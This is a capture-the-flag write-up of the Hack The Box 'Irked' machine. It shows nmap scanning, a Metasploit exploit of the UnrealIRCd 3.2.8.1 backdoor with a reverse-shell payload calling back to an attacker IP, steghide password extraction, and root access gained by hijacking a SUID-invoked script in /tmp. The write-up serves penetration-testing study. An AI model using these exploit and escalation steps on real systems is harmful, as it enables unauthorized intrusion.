---
title: "Irked"
description: "Writeup for Irked machine from HTB"
date: 2020-07-13
author: "Pablo Jesús González Rubio"
cover: "irked.png"
coverAlt: "Irked icon"
toc: true
tags: [ "Writeup" ]
---

## Scanning

```
nmap -sC -sV -Pn -p- -T5 irked.htb | tee nmap.txt
```

Output:

```
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          38536/tcp6  status
|   100024  1          49174/tcp   status
|   100024  1          54286/udp6  status
|_  100024  1          57650/udp   status
8067/tcp  open  irc     UnrealIRCd
49174/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
```

## Enumeration

We see the service UnrealIRCd which is the oddest one, in the HTTP there's no more than an image.

We try to connect to the IRC with `Weechat`:

```
/server add irked irked.htb/8067 -autoconnect
/connect irked
```

It says it's running `Unreal3.2.8.1` and that the IRC network is called ROXNet

## Exploitation

Doing a searchsploit we find some vulnerabilities for 3.2.8.1 version:

```
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                         | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                                              | windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                                       | linux/remote/13853.pl
```

We use the first one with Metasploit:

```
set RHOST irked.htb
set RPORT 8067
set LHOST 10.10.14.11
set LPORT 4444
set payload cmd/unix/reverse
run
```

We get the session as `ircd`.

## Privilege Escalation

### User

Investigating the `home` directory we see the user `djmardov`, and doing an `ls -laR` there are 2 interesting files in Documents: `.backup` y el `user.txt`.

`.backup` contains:

```
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

The text makes us understand that that's the password for a steganography image, we take the one from the HTTP port and:

```
steghide extract -sf irked.jpg
```

We get the pass: `Kab6h+m+bbp2J:HG`

With this we can SSH into the machine or change to user `djmardov` with `su`.

### Root

Looking at the SUID files (`find / -perm -u=s -type f 2>/dev/null`) we see an odd one: `/usr/bin/viewuser`. When executing it, it lists some users and runs a script in `/tmp/listusers` as root.

The way to get root access in this situation is to hijack the `listusers` script with a reverse shell or to a bash shell to get instant access, like so:

`cp /bin/sh /tmp/listusers`

We are root!
